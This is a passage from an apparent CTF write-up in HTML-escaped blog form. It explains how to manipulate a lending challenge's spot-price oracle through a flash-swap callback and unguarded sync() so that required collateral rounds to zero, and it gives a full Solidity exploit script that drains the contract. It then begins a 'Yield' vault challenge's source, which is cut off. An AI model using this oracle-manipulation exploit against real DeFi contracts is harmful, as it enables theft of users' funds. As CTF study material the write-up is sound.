&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Lending&lt;&#x2F;span&gt;&lt;span&gt; :  0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Pair&lt;&#x2F;span&gt;&lt;span&gt; :  0xE86b07a57552655eEFe68894bD346c84da238B15
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token0&lt;&#x2F;span&gt;&lt;span&gt; (or) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;collateralToken&lt;&#x2F;span&gt;&lt;span&gt;  :  0xCcb0B898D555656e582b8d17ba7b426330Abb9D8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt; (or) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;borrowToken:&lt;&#x2F;span&gt;&lt;span&gt;   0x7373EB31cBDd5428720a37d50E5ec64EfA891acc
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Pair&lt;&#x2F;span&gt;&lt;span&gt; balance of collatoralToken :  500000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Pair&lt;&#x2F;span&gt;&lt;span&gt; balance of borrowToken :  500000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Pair&lt;&#x2F;span&gt;&lt;span&gt; reserve0 :  500000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Pair&lt;&#x2F;span&gt;&lt;span&gt; reserve1 :  500000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Lending&lt;&#x2F;span&gt;&lt;span&gt; balance of collatoralToken :  0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Lending&lt;&#x2F;span&gt;&lt;span&gt; balance of borrowToken :  5000000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of collatoralToken :  0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; balance of borrowToken :  0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt; of borrowToken in terms of collatoralTokens :  1000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; :  0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As you can observe I got zero amount of both collatoral and borrow tokens, but Lending contract have the &lt;code&gt;5000e18&lt;&#x2F;code&gt; of borrow tokens and the Pair contract got the &lt;code&gt;500e18&lt;&#x2F;code&gt; amount of both the tokens.&lt;&#x2F;p&gt;
&lt;p&gt;Now for me, I don&#x27;t have any &lt;code&gt;collatoralToken&lt;&#x2F;code&gt; to borrow the token from the Lending contract and drain them all. So, lets see how the &lt;code&gt;borrow()&lt;&#x2F;code&gt; function calcuates how much collatoral needed to borrow all those &lt;code&gt;5000e18&lt;&#x2F;code&gt; amount of borrow tokens.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function borrow(uint256 _amount) external {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 needCollateral = _amount * getExchangeRate() &#x2F; 1e18;
&lt;&#x2F;span&gt;&lt;span&gt;    require(needCollateral &amp;lt;= usersCollateral[msg.sender], &amp;quot;You don&amp;#39;t have enough collateral&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    borrowToken.transfer(msg.sender, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;    usersUsedCollateral[msg.sender] += needCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;    usersCollateral[msg.sender] -= needCollateral;
&lt;&#x2F;span&gt;&lt;span&gt;    usersBorrowed[msg.sender] += _amount;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;needCollateral&lt;&#x2F;code&gt; is calculated from the &lt;code&gt;getExchangeRate()&lt;&#x2F;code&gt; and divided by the &lt;code&gt;1e18&lt;&#x2F;code&gt;. Can we make this numerator as lesser than &lt;code&gt;1e18&lt;&#x2F;code&gt; ? So that the division will rounded to zero and we don&#x27;t need to pay any &lt;code&gt;collatoralToken&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Smart right?&lt;&#x2F;p&gt;
&lt;p&gt;Lets see how can we do this? We need to make &lt;code&gt;getExchangeRate()&lt;&#x2F;code&gt; return a very small number or even zero would be perfect!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;    &#x2F;&#x2F; Lending
&lt;&#x2F;span&gt;&lt;span&gt;    function getExchangeRate() public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return pair.getSpotPrice();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;Pair
&lt;&#x2F;span&gt;&lt;span&gt;    function getSpotPrice() external view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return Math.mulDiv(reserve1, 1e18, reserve0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we can see that the price of the &lt;code&gt;collatoralToken&lt;&#x2F;code&gt; is dependent on the &lt;code&gt;reserve0&lt;&#x2F;code&gt; and &lt;code&gt;reserve1&lt;&#x2F;code&gt;. And we need to manipulate the &lt;code&gt;reserve0&lt;&#x2F;code&gt; to be a large number than &lt;code&gt;reserve1 * 1e18&lt;&#x2F;code&gt; so that the &lt;code&gt;getSpotPrice()&lt;&#x2F;code&gt; will return zero.&lt;&#x2F;p&gt;
&lt;p&gt;To do this, I found out that we can perform few swaps in the Pair contract which changes the values of &lt;code&gt;reserve0&lt;&#x2F;code&gt; and &lt;code&gt;reserve1&lt;&#x2F;code&gt;. But if we do the borrow from Lending after the &lt;code&gt;swap()&lt;&#x2F;code&gt; the again the price will be increase. So, we need to find a way to update the reserves during the swap and borrow the amount in the same transacation. If we can observe there is a callback happening to the caller in the &lt;code&gt;swap()&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;if (data.length &amp;gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;So, during this callback we can borrow from Lending contract but the reserves need a forceful update. To do this we can make use of the vulnerable &lt;code&gt;skim()&lt;&#x2F;code&gt; and &lt;code&gt;sync()&lt;&#x2F;code&gt; functions in the Pair contract.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Why &lt;code&gt;skim()&lt;&#x2F;code&gt; and &lt;code&gt;sync()&lt;&#x2F;code&gt; are vulnerable? Cause there is no reentrancy lock on these.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;    &#x2F;&#x2F; force balances to match reserves
&lt;&#x2F;span&gt;&lt;span&gt;    function skim(address to) external {
&lt;&#x2F;span&gt;&lt;span&gt;        address _token0 = token0; &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        address _token1 = token1; &#x2F;&#x2F; gas savings
&lt;&#x2F;span&gt;&lt;span&gt;        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
&lt;&#x2F;span&gt;&lt;span&gt;        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; force reserves to match balances
&lt;&#x2F;span&gt;&lt;span&gt;    function sync() external {
&lt;&#x2F;span&gt;&lt;span&gt;        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Thats how I manipulated the &lt;code&gt;borrowToken&lt;&#x2F;code&gt; price to borrowed all the tokens from Lending. Find the exploit below.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Lending.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Pair, Lending, ERC20} from &amp;quot;..&#x2F;src&#x2F;Lending.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract LendingSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Lending public lending = Lending(0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6);
&lt;&#x2F;span&gt;&lt;span&gt;    Pair public pair = lending.pair();
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20 public collateralToken = lending.collateralToken();
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20 public borrowToken = lending.borrowToken();
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Lending : &amp;quot;, address(lending));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair : &amp;quot;, address(pair));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;token0 (or) collateralToken  : &amp;quot;, pair.token0());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;token1 (or) borrowToken:  &amp;quot;, pair.token1());
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair balance of collatoralToken : &amp;quot;, collateralToken.balanceOf(address(pair)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair balance of borrowToken : &amp;quot;, borrowToken.balanceOf(address(pair)));
&lt;&#x2F;span&gt;&lt;span&gt;        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = pair.getReserves();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair reserve0 : &amp;quot;, _reserve0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair reserve1 : &amp;quot;, _reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Lending balance of collatoralToken : &amp;quot;, collateralToken.balanceOf(address(lending)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Lending balance of borrowToken : &amp;quot;, borrowToken.balanceOf(address(lending)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of collatoralToken : &amp;quot;, collateralToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of borrowToken : &amp;quot;, borrowToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;price of borrowToken in terms of collatoralTokens : &amp;quot;, lending.getExchangeRate());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance: &amp;quot;, player.balance);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = new Attack(address(lending), player);
&lt;&#x2F;span&gt;&lt;span&gt;        attack.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair balance of collatoralToken : &amp;quot;, collateralToken.balanceOf(address(pair)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pair balance of borrowToken : &amp;quot;, borrowToken.balanceOf(address(pair)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Lending balance of collatoralToken : &amp;quot;, collateralToken.balanceOf(address(lending)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Lending balance of borrowToken : &amp;quot;, borrowToken.balanceOf(address(lending)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of collatoralToken : &amp;quot;, collateralToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of borrowToken : &amp;quot;, borrowToken.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, lending.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface IUniswapV2Callee {
&lt;&#x2F;span&gt;&lt;span&gt;    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack is IUniswapV2Callee {
&lt;&#x2F;span&gt;&lt;span&gt;    Lending public lending;
&lt;&#x2F;span&gt;&lt;span&gt;    Pair public pair;
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20 public collateralToken;
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20 public borrowToken;
&lt;&#x2F;span&gt;&lt;span&gt;    address player;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _lending, address _player) {
&lt;&#x2F;span&gt;&lt;span&gt;        lending = Lending(_lending);
&lt;&#x2F;span&gt;&lt;span&gt;        pair =  lending.pair();
&lt;&#x2F;span&gt;&lt;span&gt;        collateralToken = lending.collateralToken();
&lt;&#x2F;span&gt;&lt;span&gt;        borrowToken = lending.borrowToken();
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalBorrowableBorrowTokenFromPair = borrowToken.balanceOf(address(pair)) - 1;
&lt;&#x2F;span&gt;&lt;span&gt;        pair.swap(0, totalBorrowableBorrowTokenFromPair, address(this), abi.encodePacked(&amp;quot;something&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalBorrowableBorrowTokenFromLending = borrowToken.balanceOf(address(lending));
&lt;&#x2F;span&gt;&lt;span&gt;        pair.sync();
&lt;&#x2F;span&gt;&lt;span&gt;        lending.borrow(totalBorrowableBorrowTokenFromLending);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 borrowedTokensFromLending = borrowToken.balanceOf(address(address(this)));
&lt;&#x2F;span&gt;&lt;span&gt;        borrowToken.transfer(address(pair), borrowedTokensFromLending);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;yeild&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#yeild&quot; aria-label=&quot;Anchor link for: yeild&quot;&gt;Yeild&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;UniswapV3 yield farming is so easy! Just make sure there is liquidity around the spot price. You are given 5e18 each of token0 and token1. Your goal is to get 15e18 of LP tokens.&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Yield.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: Unlicense
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.7.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-3.4.2&#x2F;contracts&#x2F;math&#x2F;Math.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-core&#x2F;contracts&#x2F;libraries&#x2F;FullMath.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-3.4.2&#x2F;contracts&#x2F;utils&#x2F;ReentrancyGuard.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-core&#x2F;contracts&#x2F;interfaces&#x2F;callback&#x2F;IUniswapV3MintCallback.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-core&#x2F;contracts&#x2F;interfaces&#x2F;callback&#x2F;IUniswapV3SwapCallback.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-core&#x2F;contracts&#x2F;interfaces&#x2F;IUniswapV3Pool.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-core&#x2F;contracts&#x2F;libraries&#x2F;TickMath.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-periphery&#x2F;contracts&#x2F;libraries&#x2F;LiquidityAmounts.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-periphery&#x2F;contracts&#x2F;libraries&#x2F;PositionKey.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-3.4.2&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Yield is
&lt;&#x2F;span&gt;&lt;span&gt;    IUniswapV3MintCallback,
&lt;&#x2F;span&gt;&lt;span&gt;    IUniswapV3SwapCallback,
&lt;&#x2F;span&gt;&lt;span&gt;    ERC20,
&lt;&#x2F;span&gt;&lt;span&gt;    ReentrancyGuard
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    event Deposit(
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed sender,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed to,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 shares,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event Withdraw(
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed sender,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed to,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 shares,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event CollectFees(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 feesToVault0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 feesToVault1,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 feesToProtocol0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 feesToProtocol1
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event Snapshot(int24 tick, uint256 totalAmount0, uint256 totalAmount1, uint256 totalSupply);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    IUniswapV3Pool public immutable pool;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public immutable token0;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public immutable token1;
&lt;&#x2F;span&gt;&lt;span&gt;    int24 public immutable tickSpacing;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public protocolFee;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public maxTotalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;    address public governance;
&lt;&#x2F;span&gt;&lt;span&gt;    address public pendingGovernance;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    int24 public lastTick;
&lt;&#x2F;span&gt;&lt;span&gt;    int24 public baseLower;
&lt;&#x2F;span&gt;&lt;span&gt;    int24 public baseUpper;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public accruedProtocolFees0;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public accruedProtocolFees1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(
&lt;&#x2F;span&gt;&lt;span&gt;        address _player,
&lt;&#x2F;span&gt;&lt;span&gt;        address _pool,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _protocolFee,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _maxTotalSupply
&lt;&#x2F;span&gt;&lt;span&gt;    ) ERC20(&amp;quot;Yield Vault&amp;quot;, &amp;quot;YV&amp;quot;) {
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;        pool = IUniswapV3Pool(_pool);
&lt;&#x2F;span&gt;&lt;span&gt;        token0 = ERC20(IUniswapV3Pool(_pool).token0());
&lt;&#x2F;span&gt;&lt;span&gt;        token1 = ERC20(IUniswapV3Pool(_pool).token1());
&lt;&#x2F;span&gt;&lt;span&gt;        tickSpacing = IUniswapV3Pool(_pool).tickSpacing();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        protocolFee = _protocolFee;
&lt;&#x2F;span&gt;&lt;span&gt;        maxTotalSupply = _maxTotalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;        governance = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;        lastTick = type(int24).max;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(_protocolFee &amp;lt; 1e6, &amp;quot;protocolFee&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return balanceOf(player) &amp;gt;= 15 ether;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function deposit(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0Desired,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1Desired,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0Min,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1Min,
&lt;&#x2F;span&gt;&lt;span&gt;        address to
&lt;&#x2F;span&gt;&lt;span&gt;    )
&lt;&#x2F;span&gt;&lt;span&gt;        external
&lt;&#x2F;span&gt;&lt;span&gt;        nonReentrant
&lt;&#x2F;span&gt;&lt;span&gt;        returns (
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 shares,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 amount1
&lt;&#x2F;span&gt;&lt;span&gt;        )
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0Desired &amp;gt; 0 || amount1Desired &amp;gt; 0, &amp;quot;amount0Desired or amount1Desired&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(to != address(0) &amp;amp;&amp;amp; to != address(this), &amp;quot;to&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Poke positions so vault&amp;#39;s current holdings are up-to-date
&lt;&#x2F;span&gt;&lt;span&gt;        _poke(baseLower, baseUpper);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Calculate amounts proportional to vault&amp;#39;s holdings
&lt;&#x2F;span&gt;&lt;span&gt;        (shares, amount0, amount1) = _calcSharesAndAmounts(amount0Desired, amount1Desired);
&lt;&#x2F;span&gt;&lt;span&gt;        require(shares &amp;gt; 0, &amp;quot;shares&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0 &amp;gt;= amount0Min, &amp;quot;amount0Min&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount1 &amp;gt;= amount1Min, &amp;quot;amount1Min&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Pull in tokens from sender
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0 &amp;gt; 0) token0.transferFrom(msg.sender, address(this), amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1 &amp;gt; 0) token1.transferFrom(msg.sender, address(this), amount1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Mint shares to recipient
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(to, shares);
&lt;&#x2F;span&gt;&lt;span&gt;        emit Deposit(msg.sender, to, shares, amount0, amount1);
